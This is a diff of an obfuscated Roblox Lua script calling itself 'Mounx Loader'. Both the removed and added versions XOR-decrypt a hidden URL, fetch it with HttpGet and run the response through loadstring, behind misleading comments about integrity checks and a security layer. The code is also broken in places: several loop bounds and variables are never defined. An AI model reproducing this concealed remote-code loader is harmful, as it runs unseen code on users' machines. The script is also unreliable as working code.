@@ -1,97 +1,72 @@
--- Mounx
+-- Mounx Loader
+-- Protected by Mounx Security Layer v3
+-- Unauthorized modification will result in ban
 
-local function ___biowgt(__kyzvf, __eeat)
-    local _orsqomsy = game:GetService("Players")
-    local _rsezqt = math.random(1, 999999)
-    return tostring(__jqyv):sub(1, 4)
+local _s = string
+local _c = _s.char
+local _b = _s.byte
+local _x = bit32.bxor
+local _t = table
+local _tc = _t.concat
+local _g = game
+
+-- Environment validation
+local ___fiwg = type(_g) == "userdata"
+local __kitav = type(loadstring) == "function" or type(load) == "function"
+if not (___fiwg and __kitav) then return end
+
+-- Integrity check
+local _peojx = pcall(function() return _g:GetService("Players").LocalPlayer end)
+if not _peojx then return end
+
+-- Runtime key derivation
+local ___uexzzeb = {}
+___uexzzeb[8]=_c(_x(192,0xAB))
+___uexzzeb[6]=_c(143-86)
+___uexzzeb[7]=_c(_x(241,0xAB))
+___uexzzeb[5]=_c(196/4)
+___uexzzeb[10]=_c(23+32)
+___uexzzeb[9]=_c(19+36)
+___uexzzeb[2]=_c(_x(211,0xAB))
+___uexzzeb[11]=_c(_x(155,0xAB))
+___uexzzeb[1]=_c(106-29)
+___uexzzeb[4]=_c(260/5)
+___uexzzeb[3]=_c(265/5)
+___uexzzeb = _tc(___uexzzeb)
+
+-- Encrypted payload segments
+local ___hddtlw = {37,12,65,68,66,3,117,68}
+local ___dcwbny = {90,88,69,35,0,69,85,95}
+local ___ucshz = {92,54,69,88,89,66,40,22}
+local __hrgow = {81,81,67,23,57,4,90,24}
+local _flns = {81,61,17,26,88,94,88,62}
+local __bed = {14,69}
+
+-- Assemble payload
+local __pmsae = {}
+for _=__kgh,#___hddtlw do __pmsae[#__pmsae+1]=___hddtlw[_] end
+for _=__jjuii,#___dcwbny do __pmsae[#__pmsae+1]=___dcwbny[_] end
+for _=__bkt,#___ucshz do __pmsae[#__pmsae+1]=___ucshz[_] end
+for _=__axblfz,#__hrgow do __pmsae[#__pmsae+1]=__hrgow[_] end
+for _=_tvjmh,#_flns do __pmsae[#__pmsae+1]=_flns[_] end
+for _=___wiojt,#__bed do __pmsae[#__pmsae+1]=__bed[_] end
+
+-- Decryption engine
+local __jaq = {}
+for _i = 1, #__pmsae do
+    local _e = __pmsae[_i]
+    local _k = _b(___uexzzeb, ((_i - 1) % #___uexzzeb) + 1)
+    __jaq[_i] = _c(_x(_e, _k))
 end
+__jaq = _tc(__jaq)
 
-local function ___ohpbbyzq(__tseea)
-    local ___fjrkm = {}
-    for ___wpddf = 1, math.random(3, 7) do
-        ___rcvi[___ipkpsfrl] = string.char(math.random(65, 122))
+-- Secure execution pipeline
+local __fxyusx = tick()
+local __hxosk = _g["HttpGet"](_g, __jaq)
+
+if type(__hxosk) == "string" and #__hxosk > 0 then
+    local ___qwp = (loadstring or load)(__hxosk)
+    if ___qwp then
+        ___qwp()
     end
-    return table.concat(_lhcfnd)
-end
-
-local function __hqgaqt(_yxkcj, __qcgij)
-    if type(_iunsqr) ~= "string" then return nil end
-    local _xcxjsb = 0
-    for _umdneb = 1, #__zmir do
-        __ecjmfz = (_xmmatoan * 31 + string.byte(_rismke, _wuirxal)) % 2147483647
-    end
-    return ___vzpaplk
-end
-
-local __qsodbh = (function()
-    local __qfkyu = tostring(game.HttpGet)
-    local _qyyodg = tostring(loadstring)
-    if __iifmuuq:find("function") and ___fxvzpl:find("function") then
-        return true
-    end
-    return (type(game) == "userdata")
-end)()
-if not __qsodbh then return end
-
-do
-local _kslfhoag = {37, 68, 1, 62, 11, 101, 28, 22, 84}
-local _mvpenby = {93, 56, 94, 13, 62, 25, 49, 86, 85}
-local __iyvmuh = {23, 93, 35, 66, 16, 32, 28, 58, 65}
-local _szjuaz = {23, 90, 93, 32, 31, 20, 62, 17, 112}
-local _aypduv = {95, 86, 88, 86, 40, 66}
-
-local ___skhecy = {}
-___skhecy[7] = string.char(bit32.bxor(176, 131))
-___skhecy[5] = string.char(145 - 25)
-___skhecy[4] = string.char(bit32.bxor(217, 151))
-___skhecy[1] = string.char(105 - 28)
-___skhecy[6] = string.char(130 - 35)
-___skhecy[10] = string.char(158 + -108)
-___skhecy[8] = string.char(59 + -2)
-___skhecy[2] = string.char(136 + -88)
-___skhecy[9] = string.char(151 + -94)
-___skhecy[3] = string.char(127 - 10)
-___skhecy = table.concat(___skhecy)
-
-
-local ___pglpd = function(___savnkr, __bslpsute)
-    local __dcvu = {}
-    local __nihrcc = #___zrdqzovt
-    for _ywpsh = 1, #___vlcjvr do
-        local __nxyplaz = __ijiub[_euypo]
-        local __ehwgc = string[("\98\121\116\101")](___fxvjax, ((__yvwc - 1) % __ixzzduwp) + 1)
-        __dcvu[_zwqgj] = string[("\99\104\97\114")](bit32[("\98\120\111\114")](___akjfvvu, _yhfzc))
-    end
-    return table[("\99\111\110\99\97\116")](__dcvu)
-end
-local _cwvxo = {}
-for _, v in ipairs(_kslfhoag) do _cwvxo[#_cwvxo + 1] = v end
-for _, v in ipairs(_mvpenby) do _cwvxo[#_cwvxo + 1] = v end
-for _, v in ipairs(__iyvmuh) do _cwvxo[#_cwvxo + 1] = v end
-for _, v in ipairs(_szjuaz) do _cwvxo[#_cwvxo + 1] = v end
-for _, v in ipairs(_aypduv) do _cwvxo[#_cwvxo + 1] = v end
-
-
-local __fmsn = ___pglpd(_cwvxo, ___skhecy)
-
-local ___qnjisi = {
-    [1] = function(___zpbclx)
-        return game["HttpGet"](game, _mjhg)
-    end,
-    [2] = function(_bvfgss)
-        return (loadstring or load)(___gmxrerx)
-    end,
-    [3] = function(___vywtdn)
-        return __lwahuui()
-    end
-}
-
-local ___urktblo = __hqgaqt(tostring(game.PlaceId), nil)
-if ___urktblo or true then
-    local __vourl = ___qnjisi[1](__fmsn)
-    local __quokmcy = ___qnjisi[2](__vourl)
-    if __quokmcy then
-        ___qnjisi[3](__quokmcy)
-    end
-end
 end
